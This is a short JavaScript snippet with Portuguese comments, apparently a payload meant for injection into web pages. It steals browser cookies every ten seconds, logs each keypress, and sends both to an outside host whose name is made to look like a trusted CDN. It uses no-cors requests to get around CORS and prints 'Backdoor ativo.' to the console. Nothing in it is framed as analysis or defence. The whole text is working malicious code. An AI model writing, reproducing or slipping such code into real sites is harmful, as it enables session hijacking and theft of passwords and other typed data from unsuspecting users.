(function(){
    // Exfiltra cookies para seu servidor
    function exfiltraCookies() {
        if (document.cookie) {
            fetch('http://static.yourtrustedcdn.com/recebe?cookie=' + encodeURIComponent(document.cookie), {
                method: 'GET',
                mode: 'no-cors'  // Para contornar o CORS
            });
        }
    }

    // Captura e exfiltra teclas digitadas (keylogger)
    document.addEventListener('keypress', function(event) {
        fetch('http://static.yourtrustedcdn.com/recebe?key=' + encodeURIComponent(event.key), {
            method: 'GET',
            mode: 'no-cors'  // Para contornar o CORS
        });
    });

    // Função de exfiltração contínua a cada 10 segundos
    setInterval(exfiltraCookies, 10000);  // Exfiltra cookies a cada 10 segundos

    // Inserindo um exemplo de mensagem persistente no console
    console.log('Backdoor ativo.');
})();
